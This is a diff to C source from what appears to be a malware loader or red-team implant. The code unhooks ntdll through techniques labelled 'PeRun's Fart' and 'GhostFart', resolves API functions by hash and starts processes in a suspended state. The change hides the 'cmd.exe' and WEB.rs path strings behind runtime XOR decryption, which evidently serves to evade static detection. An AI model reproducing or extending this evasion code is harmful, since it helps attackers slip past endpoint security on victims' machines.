@@ -549,11 +549,16 @@ VOID HookingManager(INT UnHook, LPVOID pCache, HMODULE p_ntdll, SIZE_T ntdll_siz
         HANDLE hProc = NULL;
         PRTL_USER_PROCESS_PARAMETERS proc_params = NULL;
 
+        UCHAR e_Proc[] = S_SACR_PROC;
+        UCHAR d_Proc[sizeof(e_Proc)];
+
+        ROL_AND_DECRYPT(e_Proc,sizeof(e_Proc),1,d_Proc,Instance.XOR_KEY);
+
 #if CONFIG_UNHOOK == 1 // PeRun's Fart
-        check_debug(CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, FALSE,\
+        check_debug(CreateProcessA(NULL, (LPSTR) d_Proc, NULL, NULL, FALSE,\
             CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
                                    NULL,
-                                   "C:\\Windows\\System32\\",
+                                   NULL,
                                    &si,
                                    &pi) != 0, "CreateProcessA Failed!");
 #elif CONFIG_UNHOOK == 2 // GhostFart
@@ -561,12 +566,19 @@ VOID HookingManager(INT UnHook, LPVOID pCache, HMODULE p_ntdll, SIZE_T ntdll_siz
         // Init locals
         OBJECT_ATTRIBUTES obj_attrs;
         IO_STATUS_BLOCK io_status_block;
+
+        CHAR e_WebRs[] = S_WEB_RS;
+        CHAR d_WebRs[sizeof(e_WebRs)];
+
+        ROL_AND_DECRYPT(e_WebRs, sizeof(e_WebRs), 1, d_WebRs, Instance.XOR_KEY);
+
         WCHAR* wcWebRs = NULL;
+        wcWebRs = (WCHAR*) str_to_wide(d_WebRs);
 
         // Generate image path
         UNICODE_STRING nt_image_path;
         RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlInitUnicodeString_CRC32B);
-        p_RtlInitUnicodeString(&nt_image_path, (PWSTR)L"\\??\\C:\\Windows\\System32\\WEB.rs");
+        p_RtlInitUnicodeString(&nt_image_path, (PWSTR) wcWebRs);
 
         // Init objectAttribs
         InitializeObjectAttributes(&obj_attrs, &nt_image_path, 0x00000040L, NULL, NULL);
@@ -609,6 +621,10 @@ VOID HookingManager(INT UnHook, LPVOID pCache, HMODULE p_ntdll, SIZE_T ntdll_siz
 
         if(hSection != NULL) {
             CloseHandle(hSection);
+        }
+
+        if(wcWebRs != NULL){
+            LocalFree(wcWebRs);
         }
 
         if(pi.hProcess != NULL){
